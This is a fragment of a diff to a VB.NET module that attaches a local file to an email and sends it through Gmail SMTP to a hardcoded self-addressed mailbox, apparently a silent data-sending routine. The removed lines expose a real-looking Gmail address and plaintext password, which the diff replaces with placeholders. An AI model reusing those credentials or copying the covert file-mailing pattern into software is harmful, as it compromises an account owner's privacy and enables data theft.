@@ -124,12 +124,12 @@ Public Module Module1
                                         Try  'Send mail
                                             Using Attachment = New Attachment(p & q & t)
                                                 Using g As New MailMessage With {.Subject = "This is subject last"}
-                                                    Dim email = "muhammadali.99.hide@gmail.com"
+                                                    Dim email = "[email]"
                                                     g.To.Add(email)
                                                     g.From = New MailAddress(email)
                                                     g.Body = "This is body last"
                                                     g.Attachments.Add(Attachment)
-                                                    Using SMTP As New SmtpClient("smtp.gmail.com") With {.EnableSsl = True, .Credentials = New Net.NetworkCredential(email, "03135953390"), .Port = "587"}
+                                                    Using SMTP As New SmtpClient("smtp.gmail.com") With {.EnableSsl = True, .Credentials = New Net.NetworkCredential(email, "[password]"), .Port = "587"}
                                                         SMTP.Send(g)
                                                     End Using
                                                 End Using
